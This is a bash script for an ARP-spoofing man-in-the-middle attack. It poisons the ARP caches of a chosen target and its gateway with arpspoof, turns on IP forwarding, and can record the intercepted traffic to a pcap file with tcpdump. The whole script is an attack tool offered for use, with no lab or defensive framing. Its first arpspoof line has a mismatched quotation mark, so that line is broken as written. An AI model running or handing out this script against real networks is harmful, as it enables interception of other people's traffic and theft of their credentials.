#!/bin/bash

interface=$(ip route | grep default | awk '{print $5}')

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --interface) interface="$2"; shift ;;
        --target) target="$2"; shift ;;
        --gateway) gateway="$2"; shift ;;
        --capture) capture=true ;;
        *) echo "Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

# Validate parameters
if [ -z "$target" ] || [ -z "$gateway" ]; then
    echo "Please specify --target and --gateway"
    exit 1
fi

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# Start ARP spoofing
sudo arpspoof -i "$interface -t "$target" "$gateway" &
sudo arpspoof -i "$interface" -t "$gateway" "$target" &

# Capture traffic if requested
if [ "$capture" = true ]; then
    sudo tcpdump -i "$interface" -w capture.pcap
fi
